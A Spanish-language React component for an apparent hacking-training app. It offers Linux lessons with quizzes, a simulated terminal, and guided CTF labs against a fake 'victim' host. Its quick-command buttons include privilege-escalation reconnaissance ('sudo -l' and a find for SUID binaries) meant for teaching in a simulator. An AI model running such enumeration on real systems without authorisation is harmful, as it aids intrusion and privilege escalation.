        <div style={{ background:"#050510", padding:"8px 14px", borderBottom:`1px solid ${C.border}`, display:"flex", justifyContent:"space-between", alignItems:"center" }}>
          <div style={{ display:"flex", gap:6 }}>
            {["#ff5f57","#ffbd2e","#28ca41"].map((c,i) => <div key={i} style={{ width:11, height:11, borderRadius:"50%", background:c }}/>)}
          </div>
          <span style={{ color:C.muted, fontSize:11 }}>{estado.user}@{estado.hostname}: {estado.dir}</span>
          <span style={{ color:C.muted, fontSize:10 }}>bash 5.1.16</span>
        </div>

        {/* Output */}
        <div className="thm-scroll" style={{ height:360, overflowY:"auto", padding:14 }} onClick={() => inputRef.current?.focus()}>
          {historial.map((l, i) => (
            <div key={i} className="fade" style={{
              fontSize:12, lineHeight:1.9, marginBottom:1, whiteSpace:"pre-wrap", wordBreak:"break-all",
              color: l.tipo==="input" ? C.green : l.tipo==="sistema" ? C.yellow : C.text,
            }}>{l.texto}</div>
          ))}
          <div ref={endRef}/>
        </div>

        {/* Input */}
        <div style={{ background:"#050510", borderTop:`1px solid ${C.border}`, padding:"8px 14px", display:"flex", alignItems:"center", gap:8 }}>
          <span style={{ color:promptColor, fontSize:12, flexShrink:0, userSelect:"none" }}>{prompt}</span>
          <input ref={inputRef} className="thm-input" value={input}
            onChange={e => setInput(e.target.value)} onKeyDown={onKey}
            placeholder="escribe un comando..." autoFocus spellCheck={false}/>
          <span className="cursor">█</span>
        </div>
      </div>

      {/* Comandos rápidos */}
      <div style={{ marginTop:10, display:"flex", flexWrap:"wrap", gap:6 }}>
        {["help","ls -la","pwd","whoami","sudo -l","find / -perm -4000 2>/dev/null","cat user.txt","history"].map(c => (
          <button key={c} onClick={() => { setInput(c); inputRef.current?.focus(); }}
            style={{ background:C.panel, border:`1px solid ${C.border}`, color:C.muted, padding:"4px 10px", borderRadius:4, fontSize:10, cursor:"pointer", fontFamily:"'JetBrains Mono',monospace" }}
            onMouseEnter={e => { e.target.style.borderColor=C.green+"44"; e.target.style.color=C.green; }}
            onMouseLeave={e => { e.target.style.borderColor=C.border; e.target.style.color=C.muted; }}>
            {c}
          </button>
        ))}
      </div>
    </div>
  );
}

// ─── LECCIÓN VIEW ───────────────────────────────────────────
function LeccionView({ leccion, completada, onVolver, onCompletar }) {
  const [fase, setFase] = useState("teoria"); // teoria | practica | quiz
  const [respuesta, setRespuesta] = useState(null);
  const [enviado, setEnviado] = useState(false);

  const responder = (idx) => {
    if (enviado) return;
    setRespuesta(idx);
    setEnviado(true);
    if (idx === leccion.correcta && !completada) onCompletar(leccion.id, leccion.xp);
  };

  const difCol = leccion.dificultad === "Básico" ? C.green : leccion.dificultad === "Intermedio" ? C.yellow : C.red;

  return (
    <div style={{ maxWidth:760, margin:"0 auto" }}>
      <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:16 }}>
        <button className="thm-btn" onClick={onVolver} style={{ background:C.panel, color:C.text, padding:"6px 14px", fontSize:11, border:`1px solid ${C.border}` }}>← LECCIONES</button>
        <div style={{ display:"flex", gap:8 }}>
          <span style={{ background:difCol+"22", border:`1px solid ${difCol}44`, color:difCol, borderRadius:4, padding:"3px 10px", fontSize:10, fontWeight:700 }}>{leccion.dificultad}</span>
          <span style={{ background:"#f59e0b22", border:"1px solid #f59e0b44", color:"#f59e0b", borderRadius:4, padding:"3px 10px", fontSize:10, fontWeight:700 }}>+{leccion.xp} XP</span>
          {completada && <span style={{ background:C.green+"22", border:`1px solid ${C.green}44`, color:C.green, borderRadius:4, padding:"3px 10px", fontSize:10 }}>✓ Completada</span>}
        </div>
      </div>

      <h2 style={{ color:C.white, fontSize:18, fontWeight:800, marginBottom:16 }}>{leccion.titulo}</h2>

      {/* Tabs */}
      <div style={{ display:"flex", gap:0, marginBottom:20, borderBottom:`1px solid ${C.border}` }}>
        {[["teoria","📖 Teoría"],["practica","💻 Práctica"],["quiz","🎯 Quiz"]].map(([id,label]) => (
          <button key={id} onClick={() => setFase(id)} style={{
            background:"transparent", border:"none", borderBottom:`2px solid ${fase===id?C.green:"transparent"}`,
            color:fase===id?C.green:C.muted, padding:"8px 16px", fontSize:12, cursor:"pointer",
            fontFamily:"'JetBrains Mono',monospace", transition:"all 0.2s",
          }}>{label}</button>
        ))}
      </div>

      {fase === "teoria" && (
        <div>
          <div style={{ background:"#0d0d1a", border:`1px solid ${C.border}`, borderRadius:8, padding:20, marginBottom:16 }}>
            <pre style={{ color:C.text, fontSize:13, lineHeight:1.8, margin:0, fontFamily:"'JetBrains Mono',monospace", whiteSpace:"pre-wrap" }}>{leccion.teoria}</pre>
          </div>
          <div style={{ background:"#050510", border:`1px solid ${C.green}33`, borderRadius:8, padding:16, marginBottom:16 }}>
            <div style={{ color:C.green, fontSize:10, letterSpacing:3, marginBottom:8 }}>EJEMPLO</div>
            <pre style={{ color:"#4ade80", fontSize:12, lineHeight:1.8, margin:0, fontFamily:"'JetBrains Mono',monospace", whiteSpace:"pre-wrap" }}>{leccion.ejemplo}</pre>
          </div>
          <button className="thm-btn" onClick={() => setFase("practica")} style={{ background:C.green, color:"#000", padding:"10px 20px", fontSize:13, width:"100%" }}>
            Practicar en terminal →
          </button>
        </div>
      )}

      {fase === "practica" && (
        <div>
          <p style={{ color:C.muted, fontSize:12, marginBottom:14 }}>Practica los comandos de esta lección en el simulador:</p>
          <TerminalShell />
          <button className="thm-btn" onClick={() => setFase("quiz")} style={{ background:C.cyan, color:"#000", padding:"10px 20px", fontSize:13, width:"100%", marginTop:14 }}>
            Ir al Quiz →
          </button>
        </div>
      )}

      {fase === "quiz" && (
        <div style={{ background:"#0d0d1a", border:`1px solid ${C.border}`, borderRadius:8, padding:24 }}>
          <div style={{ color:C.cyan, fontSize:10, letterSpacing:3, marginBottom:12 }}>PREGUNTA</div>
          <p style={{ color:C.white, fontSize:15, fontWeight:600, lineHeight:1.6, marginBottom:20 }}>{leccion.pregunta}</p>
          {leccion.opciones.map((op, i) => {
            let bg = "#0d0d1a", border = C.border, color = C.text;
            if (enviado) {
              if (i === leccion.correcta) { bg="#0a1f0a"; border=C.green; color=C.green; }
              else if (i === respuesta && i !== leccion.correcta) { bg="#1f0a0a"; border=C.red; color=C.red; }
            } else if (respuesta === i) { border=C.cyan; color=C.white; }
            return (
              <button key={i} className="opt-btn" disabled={enviado} onClick={() => responder(i)}
                style={{ background:bg, border:`1px solid ${border}`, color }}>
                <span style={{ color:C.cyan, marginRight:10 }}>{["A","B","C","D"][i]}.</span>{op}
              </button>
            );
          })}
          {enviado && (
            <div style={{ marginTop:14, background:respuesta===leccion.correcta?"#0a1f0a":"#1f0a0a", border:`1px solid ${respuesta===leccion.correcta?C.green:C.red}44`, borderRadius:6, padding:"12px 16px" }}>
              <div style={{ color:respuesta===leccion.correcta?C.green:C.red, fontWeight:700, marginBottom:6, fontSize:13 }}>
                {respuesta===leccion.correcta?"✅ ¡Correcto!":"❌ Incorrecto"}
              </div>
              <p style={{ color:C.text, fontSize:12, lineHeight:1.6, margin:0 }}>💡 {leccion.explicacion}</p>
            </div>
          )}
          {enviado && (
            <button className="thm-btn" onClick={onVolver} style={{ background:C.green, color:"#000", padding:"10px 20px", fontSize:13, width:"100%", marginTop:14 }}>
              ← Volver a lecciones
            </button>
          )}
        </div>
      )}
    </div>
  );
}

// ─── CTF CHALLENGE VIEW ─────────────────────────────────────
function CTFView({ desafio, onVolver, onCompletar, completado }) {
  const [paso, setPaso] = useState(0);
  const [estado, setEstado] = useState({ user:"waldo", hostname:"victim", dir:"/home/waldo", historial:[] });
  const [historial, setHistorial] = useState([
    { tipo:"sistema", texto:`🚩 DESAFÍO: ${desafio.titulo}` },
    { tipo:"sistema", texto:`Objetivo: ${desafio.pasos[0].instruccion}` },
    { tipo:"sistema", texto:"─".repeat(40) },
  ]);
  const [input, setInput] = useState("");
  const [histCmds, setHistCmds] = useState([]);
  const [histIdx, setHistIdx] = useState(-1);
  const [done, setDone] = useState(completado);
  const inputRef = useRef();
  const endRef = useRef();

  useEffect(() => { endRef.current?.scrollIntoView({ behavior:"smooth" }); }, [historial]);

  const ejecutar = (cmd) => {
    if (!cmd.trim()) return;
    const prompt = `${estado.user}@${estado.hostname}:${estado.dir}${estado.user==="root"?"#":"$"}`;
    setHistCmds(h => [cmd, ...h]);
    setHistIdx(-1);

    const { out, estado: nuevoEstado } = procesarCmd(cmd, estado);
    setEstado(nuevoEstado);

    const nuevaLineas = [
      { tipo:"input", texto:`${prompt} ${cmd}` },
      ...(out ? [{ tipo:"output", texto:out }] : []),
    ];

    // Verificar paso
    const pasoActual = desafio.pasos[paso];
    const cmdBase = cmd.trim().split(" ")[0];
    const cmdEsperadoBase = pasoActual?.cmd.split(" ")[0];
    const correcto = cmdBase === cmdEsperadoBase || cmd.includes(pasoActual?.cmd.split(" ")[1] || "XXXXXXX");

    if (correcto && !done) {
      const nuevoPaso = paso + 1;
      if (nuevoPaso >= desafio.pasos.length) {
        setDone(true);
        if (!completado) onCompletar(desafio.id, desafio.xp);
        nuevaLineas.push({ tipo:"sistema", texto:`\n🎉 ¡DESAFÍO COMPLETADO!\n+${desafio.xp} XP\n🚩 FLAG: ${desafio.flag}` });
      } else {
        setPaso(nuevoPaso);
        nuevaLineas.push({ tipo:"sistema", texto:`✅ Paso ${nuevoPaso}/${desafio.pasos.length} — Siguiente: ${desafio.pasos[nuevoPaso].instruccion}` });
      }
    }

    if (out === "__CLEAR__") setHistorial([]);
    else setHistorial(h => [...h, ...nuevaLineas]);
    setInput("");
  };

  const onKey = (e) => {
    if (e.key === "Enter") ejecutar(input);
    else if (e.key === "ArrowUp") {
      e.preventDefault();
      const i = Math.min(histIdx + 1, histCmds.length - 1);
      setHistIdx(i); setInput(histCmds[i] || "");
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const i = Math.max(histIdx - 1, -1);
      setHistIdx(i); setInput(i === -1 ? "" : histCmds[i]);
    }
  };

  const difCol = desafio.dificultad === "Fácil" ? C.green : desafio.dificultad === "Medio" ? C.yellow : C.red;
  const prompt = `${estado.user}@${estado.hostname}:${estado.dir}${estado.user==="root"?"#":"$"}`;
  const promptColor = estado.user === "root" ? C.red : C.green;

  return (
    <div style={{ maxWidth:800, margin:"0 auto" }}>
      <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:14 }}>
        <button className="thm-btn" onClick={onVolver} style={{ background:C.panel, color:C.text, padding:"6px 14px", fontSize:11, border:`1px solid ${C.border}` }}>← CTF LABS</button>
        <div style={{ display:"flex", gap:8 }}>
          <span style={{ background:difCol+"22", border:`1px solid ${difCol}44`, color:difCol, borderRadius:4, padding:"3px 10px", fontSize:10, fontWeight:700 }}>{desafio.dificultad}</span>
          <span style={{ background:"#f59e0b22", color:"#f59e0b", borderRadius:4, padding:"3px 10px", fontSize:10, fontWeight:700 }}>+{desafio.xp} XP</span>
        </div>
      </div>

      {/* Progreso pasos */}
      <div style={{ background:C.panel, border:`1px solid ${C.border}`, borderRadius:8, padding:16, marginBottom:14 }}>
        <div style={{ color:C.cyan, fontSize:10, letterSpacing:3, marginBottom:12 }}>OBJETIVOS</div>
        <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
          {desafio.pasos.map((p, i) => (
            <div key={i} style={{ display:"flex", alignItems:"center", gap:10 }}>
              <div style={{ width:20, height:20, borderRadius:"50%", background:i<paso||done?C.green+"22":i===paso?"#f59e0b22":"#1a1a2e", border:`1px solid ${i<paso||done?C.green:i===paso?"#f59e0b":C.border}`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:10, color:i<paso||done?C.green:i===paso?"#f59e0b":C.muted, flexShrink:0 }}>
                {i<paso||done?"✓":i+1}
              </div>
              <span style={{ color:i<paso||done?C.green:i===paso?C.white:C.muted, fontSize:12 }}>{p.instruccion}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Terminal */}
      <div style={{ background:"#0d0d1a", border:`1px solid ${C.green}33`, borderRadius:8, overflow:"hidden" }}>
        <div style={{ background:"#050510", padding:"8px 14px", borderBottom:`1px solid ${C.border}`, display:"flex", justifyContent:"space-between" }}>
          <div style={{ display:"flex", gap:6 }}>
            {["#ff5f57","#ffbd2e","#28ca41"].map((c,i) => <div key={i} style={{ width:11, height:11, borderRadius:"50%", background:c }}/>)}
          </div>
          <span style={{ color:C.muted, fontSize:11 }}>{prompt}</span>
          <span style={{ color:promptColor, fontSize:10 }}>{estado.user === "root" ? "⚡ ROOT" : `● ${estado.user}`}</span>
        </div>
        <div className="thm-scroll" style={{ height:320, overflowY:"auto", padding:14 }} onClick={() => inputRef.current?.focus()}>
          {historial.map((l, i) => (
            <div key={i} style={{ fontSize:12, lineHeight:1.9, marginBottom:1, whiteSpace:"pre-wrap", wordBreak:"break-all", color:l.tipo==="input"?C.green:l.tipo==="sistema"?C.yellow:C.text }}>
              {l.texto}
            </div>
          ))}
          <div ref={endRef}/>
        </div>
        <div style={{ background:"#050510", borderTop:`1px solid ${C.border}`, padding:"8px 14px", display:"flex", alignItems:"center", gap:8 }}>
          <span style={{ color:promptColor, fontSize:12, flexShrink:0 }}>{prompt}</span>
          <input ref={inputRef} className="thm-input" value={input} onChange={e=>setInput(e.target.value)} onKeyDown={onKey} placeholder="escribe el comando..." autoFocus spellCheck={false}/>
          <span className="cursor">█</span>
        </div>
      </div>

      {/* Pista */}
      {!done && (
        <details style={{ marginTop:10 }}>
          <summary style={{ color:C.cyan, fontSize:11, cursor:"pointer", padding:"6px 0" }}>💡 Ver pista para el paso actual</summary>
          <div style={{ background:"#0a1628", border:`1px solid ${C.cyan}33`, borderRadius:6, padding:"10px 14px", marginTop:6, color:C.cyan, fontSize:12, fontFamily:"'JetBrains Mono',monospace" }}>
            {desafio.pasos[paso]?.pista}
          </div>
        </details>
      )}
    </div>
  );
}

// ─── MAIN COMPONENT ─────────────────────────────────────────
export default function Terminal({ progresoRT, onCompletarRT }) {
  const [vista, setVista] = useState("menu");
  const [leccionActiva, setLeccionActiva] = useState(null);
  const [ctfActivo, setCTFActivo] = useState(null);
  const [completadas, setCompletadas] = useState([]);
  const [xp, setXP] = useState(0);

  const completar = (id, xpGanado) => {
    if (!completadas.includes(id)) {
      setCompletadas(p => [...p, id]);
      setXP(p => p + xpGanado);
      if (onCompletarRT) onCompletarRT("terminal", id, xpGanado);
    }
  };

  const progresoBloques = BLOQUES.map(b => ({
    ...b,
    completados: b.lecciones.filter(id => completadas.includes(id)).length,
    total: b.lecciones.length,
  }));

  // Vista lección
  if (vista === "leccion" && leccionActiva) {
    const lec = LECCIONES.find(l => l.id === leccionActiva);
    return (
      <div style={{ background:C.bg, minHeight:"100%", padding:"20px", fontFamily:"'JetBrains Mono',monospace" }}>
        <style>{CSS}</style>
        <LeccionView leccion={lec} completada={completadas.includes(lec.id)}
          onVolver={() => setVista("aprender")} onCompletar={completar}/>
      </div>
    );
  }

  // Vista CTF
  if (vista === "ctf_activo" && ctfActivo) {
    const desafio = DESAFIOS.find(d => d.id === ctfActivo);
    return (
      <div style={{ background:C.bg, minHeight:"100%", padding:"20px", fontFamily:"'JetBrains Mono',monospace" }}>
        <style>{CSS}</style>
        <CTFView desafio={desafio} completado={completadas.includes(desafio.id)}
          onVolver={() => setVista("ctf")} onCompletar={completar}/>
      </div>
    );
  }

  // Vista terminal libre
  if (vista === "shell") return (
    <div style={{ background:C.bg, minHeight:"100%", padding:"20px", fontFamily:"'JetBrains Mono',monospace" }}>
      <style>{CSS}</style>
      <TerminalShell titulo="TERMINAL SIMULATOR" onVolver={() => setVista("menu")}/>
    </div>
  );

  // Vista aprender
  if (vista === "aprender") return (
    <div style={{ background:C.bg, minHeight:"100%", padding:"20px", fontFamily:"'JetBrains Mono',monospace" }}>
      <style>{CSS}</style>
      <div style={{ maxWidth:860, margin:"0 auto" }}>
        <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:20 }}>
          <button className="thm-btn" onClick={() => setVista("menu")} style={{ background:C.panel, color:C.text, padding:"6px 14px", fontSize:11, border:`1px solid ${C.border}` }}>← MENÚ</button>
          <span style={{ color:C.green, fontSize:11, letterSpacing:3 }}>◈ APRENDER LINUX</span>
          <span style={{ color:C.muted, fontSize:11 }}>{completadas.filter(id => LECCIONES.find(l=>l.id===id)).length}/{LECCIONES.length}</span>
        </div>
        {BLOQUES.map(bloque => {
          const lecsBloque = LECCIONES.filter(l => l.bloque === bloque.id);
          return (
            <div key={bloque.id} style={{ marginBottom:24 }}>
              <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:12, paddingBottom:8, borderBottom:`1px solid ${C.border}` }}>
                <span style={{ fontSize:18 }}>{bloque.icon}</span>
                <span style={{ color:bloque.color, fontSize:12, fontWeight:700, letterSpacing:2 }}>{bloque.id.toUpperCase()}</span>
                <span style={{ color:C.muted, fontSize:10 }}>({lecsBloque.filter(l=>completadas.includes(l.id)).length}/{lecsBloque.length})</span>
              </div>
              <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fill,minmax(220px,1fr))", gap:10 }}>
                {lecsBloque.map(lec => {
                  const done = completadas.includes(lec.id);
                  const difCol = lec.dificultad==="Básico"?C.green:lec.dificultad==="Intermedio"?C.yellow:C.red;
                  return (
                    <div key={lec.id} onClick={() => { setLeccionActiva(lec.id); setVista("leccion"); }}
                      style={{ background:C.panel, border:`1px solid ${done?C.green:C.border}`, borderRadius:8, padding:16, cursor:"pointer", transition:"all 0.2s", position:"relative" }}
                      onMouseEnter={e => e.currentTarget.style.borderColor = done?C.green:bloque.color}
                      onMouseLeave={e => e.currentTarget.style.borderColor = done?C.green:C.border}>
                      {done && <span style={{ position:"absolute", top:10, right:12, color:C.green, fontSize:14 }}>✓</span>}
                      <div style={{ display:"flex", gap:6, marginBottom:8, flexWrap:"wrap" }}>
                        <span style={{ background:difCol+"22", border:`1px solid ${difCol}44`, color:difCol, borderRadius:4, padding:"2px 6px", fontSize:9, fontWeight:700 }}>{lec.dificultad}</span>
                        <span style={{ background:"#f59e0b22", color:"#f59e0b", borderRadius:4, padding:"2px 6px", fontSize:9 }}>+{lec.xp} XP</span>
                      </div>
                      <div style={{ color:C.white, fontSize:13, fontWeight:700 }}>{lec.titulo}</div>
                    </div>
                  );
                })}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );

  // Vista CTF Labs
  if (vista === "ctf") return (
    <div style={{ background:C.bg, minHeight:"100%", padding:"20px", fontFamily:"'JetBrains Mono',monospace" }}>
      <style>{CSS}</style>
      <div style={{ maxWidth:860, margin:"0 auto" }}>
        <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:20 }}>
          <button className="thm-btn" onClick={() => setVista("menu")} style={{ background:C.panel, color:C.text, padding:"6px 14px", fontSize:11, border:`1px solid ${C.border}` }}>← MENÚ</button>
          <span style={{ color:C.yellow, fontSize:11, letterSpacing:3 }}>◈ CTF LABS</span>
          <span style={{ color:C.muted, fontSize:11 }}>{DESAFIOS.filter(d=>completadas.includes(d.id)).length}/{DESAFIOS.length}</span>
        </div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fill,minmax(260px,1fr))", gap:14 }}>
          {DESAFIOS.map(d => {
            const done = completadas.includes(d.id);
            const difCol = d.dificultad==="Fácil"?C.green:d.dificultad==="Medio"?C.yellow:C.red;
            return (
              <div key={d.id} onClick={() => { setCTFActivo(d.id); setVista("ctf_activo"); }}
                style={{ background:C.panel, border:`1px solid ${done?C.green:C.border}`, borderRadius:10, padding:20, cursor:"pointer", transition:"all 0.2s" }}
                onMouseEnter={e => e.currentTarget.style.borderColor = done?C.green:difCol}
                onMouseLeave={e => e.currentTarget.style.borderColor = done?C.green:C.border}>
                <div style={{ display:"flex", justifyContent:"space-between", alignItems:"flex-start", marginBottom:10 }}>
                  <span style={{ fontSize:28 }}>{d.emoji}</span>
                  {done && <span style={{ color:C.green, fontSize:18 }}>✓</span>}
                </div>
                <div style={{ display:"flex", gap:6, marginBottom:8 }}>
                  <span style={{ background:difCol+"22", border:`1px solid ${difCol}44`, color:difCol, borderRadius:4, padding:"2px 8px", fontSize:10, fontWeight:700 }}>{d.dificultad}</span>
                  <span style={{ background:"#f59e0b22", color:"#f59e0b", borderRadius:4, padding:"2px 8px", fontSize:10 }}>+{d.xp} XP</span>
                </div>
                <div style={{ color:C.white, fontSize:14, fontWeight:700, marginBottom:6 }}>{d.titulo}</div>
                <div style={{ color:C.muted, fontSize:11, lineHeight:1.5 }}>{d.descripcion}</div>
                <div style={{ marginTop:10, color:difCol, fontSize:10 }}>{d.pasos.length} pasos →</div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );

  // ─── MENÚ PRINCIPAL ─────────────────────────────────────────
  return (
    <div style={{ background:C.bg, minHeight:"100%", fontFamily:"'JetBrains Mono',monospace", padding:"20px" }}>
      <style>{CSS}</style>
      <div style={{ maxWidth:900, margin:"0 auto" }}>

        {/* Header */}
        <div style={{ marginBottom:28 }}>
          <div style={{ color:C.green, fontSize:10, letterSpacing:6, marginBottom:6 }}>◈ HACKFORGE // TERMINAL</div>
          <h1 style={{ color:C.white, fontSize:26, margin:"0 0 6px", letterSpacing:2 }}>
            TERMINAL <span style={{ color:C.green }}>HQ</span>
          </h1>
          <p style={{ color:C.muted, fontSize:12, maxWidth:500 }}>
            Aprende Linux, practica en simulador real, completa desafíos CTF.
          </p>
          <div style={{ display:"flex", gap:14, marginTop:12, flexWrap:"wrap" }}>
            <div style={{ background:C.panel, border:`1px solid ${C.green}33`, borderRadius:6, padding:"7px 14px", fontSize:12 }}>
              <span style={{ color:C.green }}>⚡</span> <span style={{ color:C.white }}>{xp}</span> <span style={{ color:C.muted }}>XP</span>
            </div>
            <div style={{ background:C.panel, border:`1px solid ${C.green}33`, borderRadius:6, padding:"7px 14px", fontSize:12 }}>
              <span style={{ color:C.green }}>✓</span> <span style={{ color:C.white }}>{completadas.filter(id=>LECCIONES.find(l=>l.id===id)).length}</span> <span style={{ color:C.muted }}>/10 lecciones</span>
            </div>
            <div style={{ background:C.panel, border:`1px solid ${C.yellow}33`, borderRadius:6, padding:"7px 14px", fontSize:12 }}>
              <span style={{ color:C.yellow }}>🚩</span> <span style={{ color:C.white }}>{DESAFIOS.filter(d=>completadas.includes(d.id)).length}</span> <span style={{ color:C.muted }}>/4 CTFs</span>
            </div>
          </div>
        </div>

        {/* Cards */}
        <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fill,minmax(250px,1fr))", gap:14, marginBottom:28 }}>
          {[
            { id:"aprender", icon:"📚", titulo:"APRENDER", sub:"10 lecciones · Básico → Avanzado", color:C.green, desc:"Teoría + práctica + quiz sobre Linux, permisos, redes y hacking." },
            { id:"shell", icon:"💻", titulo:"TERMINAL", sub:"Simulador interactivo", color:C.cyan, desc:"Practica comandos reales en un sistema Linux simulado. cd .., find, sudo, cat y más." },
            { id:"ctf", icon:"🚩", titulo:"CTF LABS", sub:"4 desafíos guiados", color:C.yellow, desc:"Escenarios reales: reconocimiento, escalada de privilegios, SUID, flags." },
          ].map(item => (
            <div key={item.id} onClick={() => setVista(item.id)}
              style={{ background:C.panel, border:`1px solid ${item.color}33`, borderRadius:10, padding:22, cursor:"pointer", transition:"all 0.2s" }}
              onMouseEnter={e => { e.currentTarget.style.borderColor=item.color+"88"; e.currentTarget.style.background="#0a1628"; }}
              onMouseLeave={e => { e.currentTarget.style.borderColor=item.color+"33"; e.currentTarget.style.background=C.panel; }}>
              <div style={{ fontSize:30, marginBottom:12 }}>{item.icon}</div>
              <div style={{ color:item.color, fontSize:11, letterSpacing:3, marginBottom:4 }}>{item.titulo}</div>
              <div style={{ color:C.white, fontSize:14, fontWeight:700, marginBottom:8 }}>{item.sub}</div>
              <div style={{ color:C.muted, fontSize:11, lineHeight:1.6 }}>{item.desc}</div>
              <div style={{ marginTop:14, color:item.color, fontSize:11 }}>Entrar →</div>
            </div>
          ))}
        </div>

        {/* Progreso bloques */}
        <div style={{ background:C.panel, border:`1px solid ${C.border}`, borderRadius:10, padding:20 }}>
          <div style={{ color:C.cyan, fontSize:10, letterSpacing:3, marginBottom:14 }}>PROGRESO POR BLOQUE</div>
          <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
            {progresoBloques.map(b => {
              const pct = Math.round((b.completados/b.total)*100);
              return (
                <div key={b.id}>
                  <div style={{ display:"flex", justifyContent:"space-between", marginBottom:5 }}>
                    <span style={{ color:C.white, fontSize:12 }}>{b.icon} {b.id}</span>
                    <span style={{ color:b.color, fontSize:11 }}>{b.completados}/{b.total}</span>
                  </div>
                  <div style={{ height:3, background:C.border, borderRadius:2, overflow:"hidden" }}>
                    <div style={{ height:"100%", width:`${pct}%`, background:b.color, borderRadius:2, transition:"width 0.5s", boxShadow:`0 0 6px ${b.color}66` }}/>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}

